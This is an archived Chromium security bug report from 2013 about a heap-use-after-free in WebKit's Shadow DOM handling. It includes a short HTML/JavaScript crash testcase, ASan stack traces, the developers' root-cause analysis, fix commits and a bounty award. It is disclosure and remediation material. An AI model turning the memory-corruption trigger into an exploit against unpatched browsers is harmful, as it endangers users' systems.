# ASSERTION FAILED: node->treeScope() == m_oldScope, Heap-use-after-free in void WebCore::Private::addChildNodesToDeletionQueue<WebCore::Node, WebCore::ContainerNode>

| Field | Value |
|-------|-------|
| **Issue ID** | [40077477](https://issues.chromium.org/issues/40077477) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | sl...@gmail.com |
| **Assignee** | do...@chromium.org |
| **Created** | 2013-04-27 |
| **Bounty** | $1,000.00 |

## Description

Tested on linux 195394.

----- repro1.html -----
<script>
    window.onload = go;

    function go(){
        e = document.getElementById('id').firstChild.webkitInsertionParent;
        e.id = 'bar';
        e.attributes.item().nodeValue = 'bar';
        setTimeout(function(){window.location.reload()}, 1);
    }
</script>
<details id=id>foo</details>
-----------------------

==26293==ERROR: AddressSanitizer: heap-use-after-free on address 0x610000053888 at pc 0x7faedc14ab52 bp 0x7faeb4309b80 sp 0x7faeb4309b78
WRITE of size 8 at 0x610000053888 thread T21 (Chrome_InProcRe)
    #0 0x7faedc14ab51 in setLastChild /build/third_party/WebKit/Source/core/dom/ContainerNode.h:148
    #1 0x7faedc144087 in removeDetachedChildrenInContainer<WebCore::Node, WebCore::ContainerNode> /build/third_party/WebKit/Source/core/dom/ContainerNodeAlgorithms.h:87
    #2 0x7faedc237b42 in removedLastRefToScope /build/third_party/WebKit/Source/core/dom/Node.cpp:2556
    #3 0x7faedc2c65a8 in derefIfNotNull<WebCore::ShadowRoot> /build/third_party/WebKit/Source/wtf/PassRefPtr.h:44
    #4 0x7faedc206d9d in ~ElementShadow /build/third_party/WebKit/Source/core/dom/ElementShadow.h:51
    #5 0x7faedc206d65 in deleteOwnedPtr<WebCore::ElementShadow> /build/third_party/WebKit/Source/wtf/OwnPtrCommon.h:47
    #6 0x7faedc207d0d in operator= /build/third_party/WebKit/Source/wtf/OwnPtr.h:81
    #7 0x7faedc1eccc1 in ~Element /build/third_party/WebKit/Source/core/dom/Element.cpp:213
    #8 0x7faee115f89d in ~HTMLDetailsElement /build/third_party/WebKit/Source/core/html/HTMLDetailsElement.h:28
    #9 0x7faedc699d80 in PostGarbageCollectionProcessing /build/v8/src/global-handles.cc:277
    #10 0x7faedc6997f4 in PostGarbageCollectionProcessing /build/v8/src/global-handles.cc:659
    #11 0x7faedc6c6eb1 in PerformGarbageCollection /build/v8/src/heap.cc:994
    #12 0x7faedc6c65a2 in CollectGarbage /build/v8/src/heap.cc:653
[...]

## Attachments

- [asan1.log](attachments/asan1.log) (text/plain; charset=us-ascii, 13.6 KB)
- [repro1.html](attachments/repro1.html) (text/plain; charset=us-ascii, 304 B)
- [issue236139-author.html](attachments/issue236139-author.html) (text/plain; charset=us-ascii, 414 B)

## Timeline

### js...@chromium.org (2013-04-27)

Clusterfuzz confirmed against trunk: https://cluster-fuzz.appspot.com/testcase?key=181211163

Still working on regression range and impacts.

### in...@chromium.org (2013-04-29)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-04-29)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=181211163

Uploader: jschuh@chromium.org

Crash Type: Heap-use-after-free WRITE 8
Crash Address: 0x6110000c5288
Crash State:
  - crash stack -
  void WebCore::Private::addChildNodesToDeletionQueue<WebCore::Node, WebCore::ContainerNode>
  WebCore::ContainerNode::removeDetachedChildren
  - free stack -
  WebCore::TreeScope::adoptIfNeeded
  void WebCore::Private::addChildNodesToDeletionQueue<WebCore::Node, WebCore::ContainerNode>
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=191350:191486

Minimized Testcase (0.29 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv95cE54NzdDlLn8OWd4uavFe7DWWyeEYrzTZA9qs6dDIDGykR6cFlIfisjysGHMq_weRTF-KcyY40ZE-WsuXAkBesEuO5jcWGG90WKfZudgrc0Z7btdGiMNnYa33Sjvemq-j6JPCSWAhYxax8IBJll_bwgDr-sp57LHnLobefDAY8BxaJEI
<script>
    window.onload = go;

    function go(){
        e = document.getElementById('id').firstChild.webkitInsertionParent;
        e.id = 'bar';
        e.attributes.item().nodeValue = 'bar';
        setTimeout(function(){window.location.reload()}, 1);
    }
</script>
<details id=id>foo

### in...@chromium.org (2013-05-01)

Same assert as 236845, might be same. Needs analysis.

### in...@chromium.org (2013-05-02)

Please do read Mark's email titled "Calling a Code 28 for Security Bugs" on chrome-team mailing list.

### na...@chromium.org (2013-05-07)

[Empty comment from Monorail migration]

### dg...@chromium.org (2013-05-07)

[Empty comment from Monorail migration]

### pd...@chromium.org (2013-05-08)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-05-08)

This hits the same assertion as https://code.google.com/p/chromium/issues/detail?id=236845. Dominicc, it might be the same bug. 

### do...@chromium.org (2013-05-09)

This is in all likelihood not the same bug as https://crbug.com/chromium/236845.

hayato kindly offered to take this one.

### in...@chromium.org (2013-05-09)

Thanks Hayato@ for taking a look. Just a quick question, we have seen this assert on tree scope confusion hit twice, one here and other in 236845. Is this an indication of fatal condition, is there any safe bailout mechanism we can add to prevent these assert hits from turning into security bugs.

### do...@chromium.org (2013-05-10)

re: https://crbug.com/chromium/236139#c11

My impression from looking into https://crbug.com/chromium/236845 is that some invariant of the tree (probably related to Shadow DOM or document containment) has been messed up earlier; this assertion is the dead canary.

I think bailout should not be attempted. What would we try? Speculatively repairing the tree?

In the case of https://crbug.com/chromium/236845 there's an element in an unrelated document pointing back at the attribute where this assertion detected the problem. We'd have to guess it is still safe to dereference that document pointer and walk its tree looking at element internals to find the faulty reference, and that is just one specific case, the tree could be broken in various ways.

### do...@chromium.org (2013-05-10)

It looks like the status is still merely "assigned"; I will work on this. Problems are immediately evident; it looks like this line:

e = document.getElementById('id').firstChild.webkitInsertionParent

is leaking the DETAILS element's CONTENT element to script. Bananas.

There might be two problems here, the first being disclosing the internals of details, the second being whatever is going wrong with setting the attribute. Probably the structure of DETAILS can be simulated in user Shadow DOM.

### do...@chromium.org (2013-05-10)

I have posted <https://codereview.chromium.org/14731010> to not leak UA Shadow DOM to script. Will look at the attribute brokenness now.

### do...@chromium.org (2013-05-10)

The attribute problem is reproducible with author Shadow DOM; see attached repro.

### do...@chromium.org (2013-05-10)

Quick update:

I think I found the smoking gun; Attr::setNodeValue creates a text node child for the attribute value in Attr::createTextChild. It has its own "efficient" copy of appendChild logic which does not set the treescope on the text node it is creating. In its defense, this code is probably 1,000,000 years old and we didn't update it when we introduced treescopes.

I have a layout test that is crashing nicely. Working on a fix.

### es...@chromium.org (2013-05-10)

Yay, thanks for figuring this out!

### do...@chromium.org (2013-05-10)

I posted <https://codereview.chromium.org/14749007> for review. Realized it is possible to make this assert synchronously.

### bu...@chromium.org (2013-05-10)

------------------------------------------------------------------------
r150074 | dominicc@chromium.org | 2013-05-10T05:34:23.474445Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/Node.cpp?r1=150074&r2=150073&pathrev=150074
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dom/shadow/insertion-parent-skips-ua-shadow.html?r1=150074&r2=150073&pathrev=150074
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dom/shadow/insertion-parent-skips-ua-shadow-expected.txt?r1=150074&r2=150073&pathrev=150074

Do not leak user agent Shadow DOM to script

BUG=236139
R=morrita@chromium.org

Review URL: https://codereview.chromium.org/14731010
------------------------------------------------------------------------

### in...@chromium.org (2013-05-10)

[Empty comment from Monorail migration]

### do...@chromium.org (2013-05-10)

Reopening this. r150074 will fix this specific repro, but we need <https://codereview.chromium.org/14749007/> which is in the CQ now for a general fix.

### bu...@chromium.org (2013-05-10)

------------------------------------------------------------------------
r150076 | dominicc@chromium.org | 2013-05-10T06:31:33.399328Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dom/shadow/set-attribute-in-shadow-crash.html?r1=150076&r2=150075&pathrev=150076
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dom/shadow/set-attribute-in-shadow-crash-expected.txt?r1=150076&r2=150075&pathrev=150076
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/Attr.cpp?r1=150076&r2=150075&pathrev=150076

Set the right tree scope when creating a text node for an attribute value in Shadow DOM

BUG=236139
R=esprehn@chromium.org

Review URL: https://codereview.chromium.org/14749007
------------------------------------------------------------------------

### do...@chromium.org (2013-05-10)

This should be fixed by r150076. The cautious will verify both ClusterFuzz's repro and the one in https://crbug.com/chromium/236139#c15.

### cl...@chromium.org (2013-05-11)

ClusterFuzz has detected this issue as fixed in range 199485:199492.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=181211163

Uploader: jschuh@chromium.org

Crash Type: Heap-use-after-free WRITE 8
Crash Address: 0x6110000c5288
Crash State:
  - crash stack -
  void WebCore::Private::addChildNodesToDeletionQueue<WebCore::Node, WebCore::ContainerNode>
  WebCore::ContainerNode::removeDetachedChildren
  - free stack -
  WebCore::TreeScope::adoptIfNeeded
  void WebCore::Private::addChildNodesToDeletionQueue<WebCore::Node, WebCore::ContainerNode>
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=191350:191486
Fixed: https://cluster-fuzz.appspot.com/revisions?range=199485:199492

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95cE54NzdDlLn8OWd4uavFe7DWWyeEYrzTZA9qs6dDIDGykR6cFlIfisjysGHMq_weRTF-KcyY40ZE-WsuXAkBesEuO5jcWGG90WKfZudgrc0Z7btdGiMNnYa33Sjvemq-j6JPCSWAhYxax8IBJll_bwgDr-sp57LHnLobefDAY8BxaJEI

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2013-06-07)

M28: r152055 and r152056

### sc...@gmail.com (2013-06-07)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-07-03)

@slaweck: nice bug, $1000 etc., thanks!

### pa...@chromium.org (2013-08-20)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### ti...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/236139?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/240103]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40077477)*
